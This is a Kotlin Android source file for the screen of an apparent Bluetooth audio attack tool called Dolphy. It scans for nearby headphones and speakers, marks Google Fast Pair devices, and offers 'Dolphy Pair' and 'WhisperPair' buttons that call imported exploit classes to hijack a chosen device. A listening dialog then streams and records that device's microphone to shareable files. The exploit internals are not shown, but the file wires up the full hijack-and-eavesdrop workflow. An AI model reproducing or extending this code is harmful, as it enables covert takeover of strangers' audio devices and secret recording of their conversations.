package com.droid.dolphy.bluetooth.audio

import com.droid.dolphy.DolphyIconButton

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothClass
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.provider.Settings
import android.os.Build
import android.bluetooth.BluetoothProfile
import android.bluetooth.BluetoothHeadset
import android.net.Uri
import android.media.MediaPlayer
import android.content.ContentValues
import android.provider.MediaStore
import androidx.compose.material.icons.filled.*
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import androidx.navigation.NavController
import com.droid.dolphy.M3SegmentedListItemContainer
import com.droid.dolphy.M3SegmentedListItemSpacing
import com.droid.dolphy.MaterialBackground
import com.droid.dolphy.MaterialCard
import com.droid.dolphy.R
import com.droid.dolphy.SectionTopBar
import com.droid.dolphy.bluetooth.whisperpair.BluetoothAudioManager
import com.droid.dolphy.bluetooth.whisperpair.DolphyPairExploit
import com.droid.dolphy.bluetooth.whisperpair.FastPairExploit
import com.droid.dolphy.bluetooth.whisperpair.hasGoogleFastPair
import com.droid.dolphy.m3SegmentedItems
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

enum class ConnectionStatus {
    IDLE, CONNECTING, EXPLOITING, STANDARD_PAIRING, SUCCESS, FAILED
}

data class ScannerDeviceUi(
    val name: String,
    val address: String,
    val rssi: Int,
    
    val hasFastPair: Boolean = false,
)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AudioScannerScreen(navController: NavController) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val snackbarHostState = remember { SnackbarHostState() }
    val devices = remember { mutableStateMapOf<String, ScannerDeviceUi>() }
    val connectionStates = remember { mutableStateMapOf<String, ConnectionStatus>() }
    val exploitLogs = remember { mutableStateMapOf<String, String>() }
    var isScanning by remember { mutableStateOf(false) }
    var showQuietConnectDialog by remember { mutableStateOf(false) }

    var selectedTab by remember { mutableIntStateOf(0) }
    val tabs = listOf(stringResource(R.string.audio_scanner_tab_scanner), stringResource(R.string.audio_scanner_tab_recordings))

    val bluetoothManager = remember { context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager }
    val bluetoothAdapter = remember { bluetoothManager?.adapter }
    val bleScanner = remember(bluetoothAdapter) { bluetoothAdapter?.bluetoothLeScanner }

    val audioManager = remember { BluetoothAudioManager(context) }
    val exploitManager = remember { FastPairExploit(context) }
    val dolphyPair = remember { DolphyPairExploit(context) }
    var listeningDevice by remember { mutableStateOf<ScannerDeviceUi?>(null) }
    val connectingDeviceAddress = remember { mutableStateOf<String?>(null) }

    val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
        arrayOf(
            Manifest.permission.BLUETOOTH_SCAN,
            Manifest.permission.BLUETOOTH_CONNECT,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
    } else {
        arrayOf(
            Manifest.permission.BLUETOOTH,
            Manifest.permission.BLUETOOTH_ADMIN,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
    }

    fun hasPermissions(): Boolean {
        return permissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun addOrUpdateDevice(
        device: BluetoothDevice,
        rssi: Int,
        btClass: BluetoothClass? = null,
        hasFastPair: Boolean = false,
    ) {
        val name = try { device.name } catch (_: SecurityException) { null } ?: "Unknown Device"
        val majorClass = btClass?.majorDeviceClass ?: BluetoothClass.Device.Major.UNCATEGORIZED

        val n = name.lowercase()
        val isAudio = majorClass == BluetoothClass.Device.Major.AUDIO_VIDEO ||
            n.contains("buds") || n.contains("airpods") || n.contains("head") ||
            n.contains("ear") || n.contains("audio") || n.contains("speaker") ||
            n.contains("sony") || n.contains("jbl") || n.contains("beat") ||
            n.contains("marshall") || n.contains("bose") || n.contains("sennheiser") ||
            n.contains("galaxy") || n.contains("pixel") || n.contains("soundcore") ||
            n.contains("anker") || n.contains("huawei") || n.contains("xiaomi") ||
            n.contains("redmi") || n.contains("oppo") || n.contains("realme") ||
            n.contains("nothing") || n.contains("earfun") || n.contains("qcy") ||
            n.contains("tozo") || n.contains("skullcandy") || n.contains("jabra") ||
            n.contains("wh-") || n.contains("wf-") || n.contains("linkbuds")

        if (isAudio || hasFastPair) {
            val prev = devices[device.address]
            val displayName = when {
                name.isNotBlank() && name != "Unknown Device" -> name
                hasFastPair || prev?.hasFastPair == true -> prev?.name?.takeIf {
                    it.isNotBlank() && it != "Unknown Device"
                } ?: "Fast Pair audio"
                else -> prev?.name ?: "Unknown Audio"
            }
            devices[device.address] = ScannerDeviceUi(
                name = displayName,
                address = device.address,
                rssi = if (rssi == Int.MIN_VALUE) (prev?.rssi ?: rssi) else rssi,
                hasFastPair = (prev?.hasFastPair == true) || hasFastPair,
            )
            if (!connectionStates.containsKey(device.address)) {
                connectionStates[device.address] = ConnectionStatus.IDLE
            }
        }
    }

    val bleCallback = remember {
        object : ScanCallback() {
            override fun onScanResult(callbackType: Int, result: ScanResult) {
                addOrUpdateDevice(
                    result.device,
                    result.rssi,
                    hasFastPair = result.hasGoogleFastPair(),
                )
            }
        }
    }

    val receiver = remember {
        object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                when (intent?.action) {
                    BluetoothDevice.ACTION_FOUND -> {
                        val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                        } else {
                            @Suppress("DEPRECATION")
                            intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                        }
                        val btClass = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            intent.getParcelableExtra(BluetoothDevice.EXTRA_CLASS, BluetoothClass::class.java)
                        } else {
                            @Suppress("DEPRECATION")
                            intent.getParcelableExtra(BluetoothDevice.EXTRA_CLASS)
                        }
                        val rssi = intent.getShortExtra(BluetoothDevice.EXTRA_RSSI, Short.MIN_VALUE).toInt()
                        if (device != null) addOrUpdateDevice(device, rssi, btClass)
                    }
                    BluetoothHeadset.ACTION_CONNECTION_STATE_CHANGED -> {
                        val state = intent.getIntExtra(BluetoothProfile.EXTRA_STATE, BluetoothProfile.STATE_DISCONNECTED)
                        val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                        } else {
                            @Suppress("DEPRECATION")
                            intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                        }
                        if (device?.address != null && state == BluetoothProfile.STATE_CONNECTED) {
                            connectionStates[device.address] = ConnectionStatus.SUCCESS
                        }
                    }
                    BluetoothAdapter.ACTION_DISCOVERY_FINISHED -> { isScanning = false }
                }
            }
        }
    }

    fun stopScan() {
        if (isScanning) {
            try {
                bluetoothAdapter?.cancelDiscovery()
                bleScanner?.stopScan(bleCallback)
            } catch (_: Exception) {}
            isScanning = false
        }
    }

    fun startScan() {
        if (!hasPermissions() || bluetoothAdapter?.isEnabled != true) return

        devices.clear()


        try {
            bluetoothAdapter.bondedDevices?.forEach { device ->
                val isConnected = try {
                    val method = device.javaClass.getMethod("isConnected")
                    method.invoke(device) as Boolean
                } catch (e: Exception) { false }


                if (isConnected) {
                    addOrUpdateDevice(device, -50, device.bluetoothClass)
                    connectionStates[device.address] = ConnectionStatus.SUCCESS
                }
            }
        } catch (_: SecurityException) {}

        isScanning = true
        bluetoothAdapter.startDiscovery()
        val settings = ScanSettings.Builder().setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY).build()
        try { bleScanner?.startScan(null, settings, bleCallback) } catch (_: Exception) {}

        scope.launch {
            delay(15000)
            stopScan()
        }
    }

    val bluetoothEnableLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (hasPermissions() && bluetoothAdapter?.isEnabled == true) {
            startScan()
        }
    }

    val permissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        if (result.values.all { it }) {
            if (bluetoothAdapter?.isEnabled == true) {
                startScan()
            } else {
                bluetoothEnableLauncher.launch(Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE))
            }
        }
    }

    DisposableEffect(Unit) {
        val filter = IntentFilter().apply {
            addAction(BluetoothDevice.ACTION_FOUND)
            addAction(BluetoothHeadset.ACTION_CONNECTION_STATE_CHANGED)
            addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED)
        }
        context.registerReceiver(receiver, filter)
        onDispose {
            context.unregisterReceiver(receiver)
            stopScan()
            audioManager.release()
        }
    }

    LaunchedEffect(Unit) {
        audioManager.initialize { }
        if (hasPermissions()) {
            if (bluetoothAdapter?.isEnabled == true) {
                startScan()
            } else {
                bluetoothEnableLauncher.launch(Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE))
            }
        } else {
            permissionLauncher.launch(permissions)
        }
    }

    val accentColor = MaterialTheme.colorScheme.primary

    MaterialBackground(accentColor = accentColor) {
        Scaffold(
            containerColor = Color.Transparent,
            snackbarHost = { SnackbarHost(snackbarHostState) },
            topBar = {
                Column {
                    SectionTopBar(
                        title = stringResource(R.string.audio_scanner_title),
                        onBack = { navController.popBackStack() },
                        transparent = true,
                        actions = {
                            if (selectedTab == 0) {
                                DolphyIconButton(onClick = { startScan() }, enabled = !isScanning) {
                                    Icon(Icons.Default.Refresh, contentDescription = stringResource(R.string.cd_refresh))
                                }
                            }
                        }
                    )


                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(horizontal = 16.dp, vertical = 8.dp),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        tabs.forEachIndexed { index, title ->
                            val isSelected = selectedTab == index
                            Surface(
                                modifier = Modifier
                                    .weight(1f)
                                    .clip(RoundedCornerShape(50))
                                    .clickable { selectedTab = index },
                                color = if (isSelected) accentColor else Color.Transparent,
                                shape = RoundedCornerShape(50),
                                border = BorderStroke(
                                    1.5.dp,
                                    if (isSelected) accentColor else accentColor.copy(alpha = 0.3f)
                                )
                            ) {
                                Box(
                                    modifier = Modifier.padding(vertical = 10.dp),
                                    contentAlignment = Alignment.Center
                                ) {
                                    Text(
                                        text = title,
                                        color = if (isSelected) Color.White else accentColor.copy(alpha = 0.6f),
                                        fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal,
                                        style = MaterialTheme.typography.bodyMedium
                                    )
                                }
                            }
                        }
                    }
                }
            }
        ) { padding ->
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding)
                    .padding(horizontal = 16.dp)
            ) {
                if (selectedTab == 0) {
                    if (devices.isEmpty() && isScanning) {
                        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                CircularProgressIndicator(
                                    modifier = Modifier.size(64.dp),
                                    strokeWidth = 4.dp,
                                    color = accentColor
                                )
                                Spacer(modifier = Modifier.height(16.dp))
                                Text(
                                    stringResource(R.string.audio_searching),
                                    style = MaterialTheme.typography.bodyLarge,
                                    color = accentColor
                                )
                            }
                        }
                    } else if (devices.isEmpty() && !isScanning) {
                        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                            DolphyIconButton(
                                onClick = { startScan() },
                                modifier = Modifier
                                    .size(100.dp)
                                    .background(accentColor, RoundedCornerShape(20.dp))
                            ) {
                                Icon(
                                    Icons.Default.Refresh,
                                    contentDescription = "Restart",
                                    tint = Color.White,
                                    modifier = Modifier.size(48.dp)
                                )
                            }
                        }
                    } else {
                        Column {
                            val deviceList = devices.values.toList().sortedByDescending { it.rssi }
                            LazyColumn(
                                verticalArrangement = Arrangement.spacedBy(M3SegmentedListItemSpacing),
                                contentPadding = PaddingValues(bottom = 88.dp)
                            ) {
                                m3SegmentedItems(deviceList, key = { it.address }) { index, count, device ->
                                    AudioDeviceRow(
                                        device = device,
                                        status = connectionStates[device.address] ?: ConnectionStatus.IDLE,
                                        accentColor = accentColor,
                                        segmentedIndex = index,
                                        segmentedCount = count,
                                        onConnect = {
                                            connectingDeviceAddress.value = device.address
                                            connectionStates[device.address] = ConnectionStatus.CONNECTING
                                            try {
                                                context.startActivity(Intent(Settings.ACTION_BLUETOOTH_SETTINGS).apply {
                                                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                                })
                                            } catch (_: Exception) { }
                                        },
                                        onDolphyPair = {
                                            connectingDeviceAddress.value = device.address
                                            connectionStates[device.address] = ConnectionStatus.EXPLOITING
                                            exploitLogs[device.address] =
                                                context.getString(R.string.audio_hijack_starting)
                                            dolphyPair.hijack(
                                                device.address,
                                                audioManager,
                                                onProgress = { msg ->
                                                    exploitLogs[device.address] = msg
                                                },
                                                onResult = { r ->
                                                    when (r) {
                                                        is DolphyPairExploit.Result.Success -> {
                                                            connectionStates[device.address] =
                                                                ConnectionStatus.SUCCESS
                                                            exploitLogs[device.address] =
                                                                context.getString(
                                                                    R.string.audio_hijack_ok,
                                                                    r.method,
                                                                )
                                                            listeningDevice = device
                                                        }
                                                        is DolphyPairExploit.Result.Failed -> {
                                                            connectionStates[device.address] =
                                                                ConnectionStatus.FAILED
                                                            exploitLogs[device.address] =
                                                                context.getString(
                                                                    R.string.audio_hijack_fail,
                                                                    r.reason,
                                                                )
                                                        }
                                                    }
                                                },
                                            )
                                        },
                                        onWhisperPair = {
                                            connectingDeviceAddress.value = device.address
                                            connectionStates[device.address] = ConnectionStatus.EXPLOITING
                                            exploitLogs[device.address] =
                                                context.getString(R.string.audio_hijack_starting)
                                            exploitManager.exploitWithAudio(
                                                device.address,
                                                audioManager,
                                                onProgress = { msg ->
                                                    exploitLogs[device.address] = msg
                                                },
                                                onResult = { result ->
                                                    when (result) {
                                                        is FastPairExploit.ExploitResult.AudioConnected,
                                                        is FastPairExploit.ExploitResult.Success,
                                                        is FastPairExploit.ExploitResult.PartialSuccess -> {
                                                            connectionStates[device.address] =
                                                                ConnectionStatus.SUCCESS
                                                            exploitLogs[device.address] =
                                                                context.getString(
                                                                    R.string.audio_hijack_ok,
                                                                    "WhisperPair/FastPair",
                                                                )
                                                            if (result is FastPairExploit.ExploitResult.AudioConnected) {
                                                                listeningDevice = device
                                                            }
                                                        }
                                                        is FastPairExploit.ExploitResult.Failed -> {
                                                            connectionStates[device.address] =
                                                                ConnectionStatus.FAILED
                                                            exploitLogs[device.address] =
                                                                context.getString(
                                                                    R.string.audio_hijack_fail,
                                                                    result.reason,
                                                                )
                                                        }
                                                        else -> {
                                                            connectionStates[device.address] =
                                                                ConnectionStatus.FAILED
                                                            exploitLogs[device.address] =
                                                                context.getString(R.string.audio_error_label)
                                                        }
                                                    }
                                                },
                                            )
                                        },
                                        exploitStatus = exploitLogs[device.address],
                                        onListen = { listeningDevice = device }
                                    )
                                }
                            }
                        }
                    }
                } else {
                    RecordingsList(context, accentColor)
                }
            }

            if (listeningDevice != null) {
                ListeningDialog(
                    device = listeningDevice!!,
                    audioManager = audioManager,
                    accentColor = accentColor,
                    onDismiss = { listeningDevice = null }
                )
            }


            if (showQuietConnectDialog) {
                AlertDialog(
                    onDismissRequest = { showQuietConnectDialog = false },
                    title = {
                        Text(
                            text = stringResource(R.string.audio_quiet_connect_title),
                            fontWeight = FontWeight.Bold
                        )
                    },
                    text = {
                        Text(
                            text = stringResource(R.string.audio_quiet_connect_text)
                        )
                    },
                    confirmButton = {
                        TextButton(
                            onClick = { showQuietConnectDialog = false }
                        ) {
                            Text(
                                text = stringResource(R.string.ok),
                                color = accentColor,
                                fontWeight = FontWeight.Medium
                            )
                        }
                    },
                    containerColor = MaterialTheme.colorScheme.surface,
                    titleContentColor = MaterialTheme.colorScheme.onSurface,
                    textContentColor = MaterialTheme.colorScheme.onSurfaceVariant
                )
            }
        }
    }
}

@Composable
fun RecordingsList(context: Context, accentColor: Color) {
    var recordings by remember { mutableStateOf(listOf<File>()) }
    val musicDir = context.getExternalFilesDir(android.os.Environment.DIRECTORY_MUSIC)
    var mediaPlayer by remember { mutableStateOf<MediaPlayer?>(null) }
    var playingFile by remember { mutableStateOf<File?>(null) }
    val scope = rememberCoroutineScope()

    fun refreshFiles() {
        recordings = musicDir?.listFiles { f -> f.extension == "m4a" || f.extension == "wav" }
            ?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    LaunchedEffect(Unit) { refreshFiles() }
    DisposableEffect(Unit) { onDispose { mediaPlayer?.release() } }

    if (recordings.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text(stringResource(R.string.audio_no_recordings), color = MaterialTheme.colorScheme.onSurfaceVariant)
        }
    } else {
        LazyColumn(verticalArrangement = Arrangement.spacedBy(12.dp), contentPadding = PaddingValues(top = 16.dp, bottom = 32.dp)) {
            items(recordings, key = { it.absolutePath }) { file ->
                MaterialCard {
                    Row(modifier = Modifier.fillMaxWidth().padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                        DolphyIconButton(onClick = {
                            if (playingFile == file) {
                                mediaPlayer?.pause()
                                playingFile = null
                            } else {
                                if (playingFile != null) mediaPlayer?.stop()
                                mediaPlayer?.release()
                                mediaPlayer = MediaPlayer.create(context, Uri.fromFile(file))
                                mediaPlayer?.start()
                                playingFile = file
                                mediaPlayer?.setOnCompletionListener { playingFile = null }
                            }
                        }) {
                            Icon(
                                imageVector = if (playingFile == file) Icons.Default.Pause else Icons.Default.PlayArrow,
                                contentDescription = null,
                                tint = if (playingFile == file) Color.Red else accentColor
                            )
                        }
                        Column(modifier = Modifier.weight(1f).padding(horizontal = 8.dp)) {
                            Text(
                                text = file.name.removeSuffix(".m4a").removeSuffix(".wav"),
                                style = MaterialTheme.typography.bodyMedium,
                                fontWeight = if (playingFile == file) FontWeight.Bold else FontWeight.Normal,
                                maxLines = 1,
                                overflow = TextOverflow.Ellipsis
                            )
                            Text(
                                text = "${file.length() / 1024} KB • ${java.text.SimpleDateFormat("dd.MM HH:mm").format(file.lastModified())}",
                                style = MaterialTheme.typography.labelSmall,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )
                        }

                        Row {
                            DolphyIconButton(onClick = {
                                val uri = FileProvider.getUriForFile(context, "${context.packageName}.provider", file)
                                context.startActivity(Intent.createChooser(Intent(Intent.ACTION_SEND).apply {
                                    type = "audio/*"
                                    putExtra(Intent.EXTRA_STREAM, uri)
                                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                                }, "Поделиться"))
                            }) { Icon(Icons.Default.Share, contentDescription = null, modifier = Modifier.size(20.dp)) }

                            DolphyIconButton(onClick = {
                                if (playingFile == file) {
                                    mediaPlayer?.stop()
                                    playingFile = null
                                }
                                file.delete()
                                refreshFiles()
                            }) {
                                Icon(Icons.Default.Delete, contentDescription = null, modifier = Modifier.size(20.dp), tint = Color.Red.copy(alpha = 0.6f))
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun AudioDeviceRow(
    device: ScannerDeviceUi,
    status: ConnectionStatus,
    accentColor: Color,
    exploitStatus: String? = null,
    segmentedIndex: Int = 0,
    segmentedCount: Int = 1,
    onConnect: () -> Unit,
    onDolphyPair: () -> Unit,
    onWhisperPair: () -> Unit,
    onListen: () -> Unit,
) {
    val dolphyColor = Color(0xFFE91E63)
    val whisperColor = Color(0xFF7C4DFF)
    val busy = status == ConnectionStatus.CONNECTING || status == ConnectionStatus.EXPLOITING

    M3SegmentedListItemContainer(
        index = segmentedIndex,
        count = segmentedCount,
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            verticalAlignment = Alignment.CenterVertically,
        ) {
            Box(
                modifier = Modifier.size(48.dp).clip(CircleShape).background(accentColor.copy(alpha = 0.1f)),
                contentAlignment = Alignment.Center,
            ) {
                Icon(Icons.Default.Headphones, contentDescription = null, tint = accentColor)
            }

            Spacer(modifier = Modifier.width(12.dp))

            Column(modifier = Modifier.weight(1f)) {
                Text(
                    device.name,
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.Bold,
                    maxLines = 1,
                    overflow = TextOverflow.Ellipsis,
                )
                Text(
                    device.address,
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                )
                if (device.hasFastPair) {
                    Text(
                        "Fast Pair",
                        style = MaterialTheme.typography.labelSmall,
                        color = whisperColor,
                        fontWeight = FontWeight.SemiBold,
                    )
                }

                Spacer(modifier = Modifier.height(8.dp))

                if (status == ConnectionStatus.SUCCESS) {
                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(50))
                            .background(accentColor)
                            .clickable { onListen() }
                            .padding(horizontal = 16.dp, vertical = 8.dp),
                        contentAlignment = Alignment.Center,
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.Center,
                        ) {
                            Icon(
                                Icons.Default.Mic,
                                contentDescription = null,
                                modifier = Modifier.size(16.dp),
                                tint = Color.White,
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                stringResource(R.string.audio_listen),
                                color = Color.White,
                                style = MaterialTheme.typography.labelMedium,
                                fontWeight = FontWeight.Medium,
                            )
                        }
                    }
                } else {
                    Column(
                        modifier = Modifier.fillMaxWidth(),
                        verticalArrangement = Arrangement.spacedBy(8.dp),
                    ) {
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clip(RoundedCornerShape(50))
                                .background(accentColor)
                                .clickable(enabled = !busy) { onConnect() }
                                .padding(vertical = 10.dp, horizontal = 14.dp),
                            contentAlignment = Alignment.Center,
                        ) {
                            Text(
                                text = if (status == ConnectionStatus.CONNECTING) {
                                    stringResource(R.string.audio_waiting)
                                } else {
                                    stringResource(R.string.audio_connect)
                                },
                                color = Color.White,
                                style = MaterialTheme.typography.labelMedium,
                                fontWeight = FontWeight.Medium,
                                maxLines = 1,
                            )
                        }

                        if (status == ConnectionStatus.EXPLOITING) {
                            Box(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .clip(RoundedCornerShape(50))
                                    .background(dolphyColor.copy(alpha = 0.75f))
                                    .padding(vertical = 10.dp, horizontal = 14.dp),
                                contentAlignment = Alignment.Center,
                            ) {
                                Row(
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.Center,
                                ) {
                                    CircularProgressIndicator(
                                        modifier = Modifier.size(14.dp),
                                        strokeWidth = 2.dp,
                                        color = Color.White,
                                    )
                                    Spacer(modifier = Modifier.width(8.dp))
                                    Text(
                                        text = stringResource(R.string.audio_hacking),
                                        color = Color.White,
                                        style = MaterialTheme.typography.labelMedium,
                                        fontWeight = FontWeight.SemiBold,
                                        maxLines = 1,
                                    )
                                }
                            }
                        } else {
                            Row(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .height(40.dp)
                                    .clip(RoundedCornerShape(50)),
                            ) {
                                Box(
                                    modifier = Modifier
                                        .weight(1f)
                                        .fillMaxSize()
                                        .background(dolphyColor)
                                        .clickable(enabled = !busy) { onDolphyPair() }
                                        .padding(horizontal = 8.dp),
                                    contentAlignment = Alignment.Center,
                                ) {
                                    Text(
                                        text = stringResource(R.string.audio_dolphy_pair),
                                        color = Color.White,
                                        style = MaterialTheme.typography.labelMedium,
                                        fontWeight = FontWeight.SemiBold,
                                        maxLines = 1,
                                    )
                                }
                                Box(
                                    modifier = Modifier
                                        .width(1.dp)
                                        .fillMaxSize()
                                        .background(Color.White.copy(alpha = 0.35f)),
                                )
                                Box(
                                    modifier = Modifier
                                        .weight(1f)
                                        .fillMaxSize()
                                        .background(whisperColor)
                                        .clickable(enabled = !busy) { onWhisperPair() }
                                        .padding(horizontal = 8.dp),
                                    contentAlignment = Alignment.Center,
                                ) {
                                    Text(
                                        text = stringResource(R.string.audio_whisper_pair),
                                        color = Color.White,
                                        style = MaterialTheme.typography.labelMedium,
                                        fontWeight = FontWeight.SemiBold,
                                        maxLines = 1,
                                    )
                                }
                            }
                        }
                    }
                }

                if (exploitStatus != null && status != ConnectionStatus.IDLE) {
                    Spacer(modifier = Modifier.height(4.dp))
                    Text(
                        text = exploitStatus,
                        style = MaterialTheme.typography.labelSmall,
                        color = if (status == ConnectionStatus.FAILED) Color.Red else accentColor,
                        maxLines = 2,
                        overflow = TextOverflow.Ellipsis,
                    )
                }
            }

            Column(horizontalAlignment = Alignment.End, modifier = Modifier.padding(start = 8.dp)) {
                Text(
                    "${device.rssi} dBm",
                    style = MaterialTheme.typography.labelSmall,
                    color = accentColor.copy(alpha = 0.7f),
                )
                Spacer(modifier = Modifier.height(4.dp))
                val signalProgress = (device.rssi + 100).coerceIn(0, 100) / 100f
                val signalColor = when {
                    device.rssi > -60 -> Color(0xFF4CAF50)
                    device.rssi > -80 -> Color(0xFFFFC107)
                    else -> Color(0xFFF44336)
                }
                LinearProgressIndicator(
                    progress = { signalProgress },
                    modifier = Modifier.width(32.dp).height(4.dp).clip(CircleShape),
                    color = signalColor,
                    trackColor = accentColor.copy(alpha = 0.1f),
                )
            }
        }
    }
    }

@Composable
fun ListeningDialog(
    device: ScannerDeviceUi,
    audioManager: BluetoothAudioManager,
    accentColor: Color,
    onDismiss: () -> Unit
) {
    val context = LocalContext.current
    var isListening by remember { mutableStateOf(false) }
    var isRecording by remember { mutableStateOf(false) }
    var recordingFile by remember { mutableStateOf<String?>(null) }
    val scope = rememberCoroutineScope()

    LaunchedEffect(Unit) {
        audioManager.startListening { state ->
            isListening = state is BluetoothAudioManager.AudioState.Listening
        }
    }

    Dialog(
        onDismissRequest = onDismiss,
        properties = DialogProperties(usePlatformDefaultWidth = false)
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(0.9f).wrapContentHeight(),
            shape = RoundedCornerShape(28.dp),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(
                    text = if (isRecording) stringResource(R.string.audio_recording_title) else stringResource(R.string.audio_listening_title),
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.Bold
                )
                Text(text = device.name, style = MaterialTheme.typography.bodySmall, color = accentColor)

                Spacer(modifier = Modifier.height(40.dp))

                val infiniteTransition = rememberInfiniteTransition(label = "Pulse")
                val scale by infiniteTransition.animateFloat(
                    initialValue = 1f, targetValue = 1.4f,
                    animationSpec = infiniteRepeatable(animation = tween(800), repeatMode = RepeatMode.Reverse),
                    label = "Pulse"
                )

                Box(contentAlignment = Alignment.Center) {
                    if (isListening || isRecording) {
                        Box(modifier = Modifier.size(120.dp).background(if (isRecording) Color.Red.copy(0.08f) else accentColor.copy(0.08f), CircleShape))
                    }
                    Surface(modifier = Modifier.size(80.dp), shape = CircleShape, color = (if (isRecording) Color.Red else accentColor).copy(0.1f)) {
                        Icon(imageVector = Icons.Default.Mic, contentDescription = null, modifier = Modifier.size(40.dp).padding(20.dp), tint = if (isRecording) Color.Red else accentColor)
                    }
                }

                Spacer(modifier = Modifier.height(40.dp))

                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    Button(
                        onClick = {
                            if (!isRecording) {
                                val musicDir = context.getExternalFilesDir(android.os.Environment.DIRECTORY_MUSIC)
                                if (musicDir != null) {
                                    audioManager.startRecording(musicDir,
                                        onStateChange = { isRecording = it is BluetoothAudioManager.AudioState.Recording },
                                        onRecordingComplete = { recordingFile = it.file.name; isRecording = false }
                                    )
                                }
                            } else {
                                audioManager.stopRecording()
                                isRecording = false
                            }
                        },
                        modifier = Modifier.weight(1f),
                        colors = ButtonDefaults.buttonColors(containerColor = if (isRecording) Color.Red else MaterialTheme.colorScheme.secondaryContainer)
                    ) { Text(if (isRecording) stringResource(R.string.audio_stop) else stringResource(R.string.audio_record)) }

                    Button(onClick = onDismiss, modifier = Modifier.weight(1f)) { Text(stringResource(R.string.audio_close)) }
                }

                if (recordingFile != null) {
                    Spacer(modifier = Modifier.height(16.dp))
                    Text(stringResource(R.string.audio_file_label, recordingFile ?: ""), style = MaterialTheme.typography.labelSmall, color = Color(0xFF4CAF50))
                }
            }
        }
    }
}

